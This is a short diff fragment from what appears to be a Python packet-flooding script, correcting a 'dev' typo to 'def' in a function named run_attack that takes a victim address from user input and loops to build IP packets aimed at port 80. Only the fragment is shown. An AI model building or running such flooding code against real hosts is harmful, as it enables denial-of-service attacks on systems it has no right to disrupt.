@@ -11,7 +11,7 @@ def set_victim_ip():
     victim = vic_dev(input("> "))
     return victim
 
-dev run_attack(victim):
+def run_attack(victim):
     port = 80
     for x in range(0,99999):
         packetIP = IP()
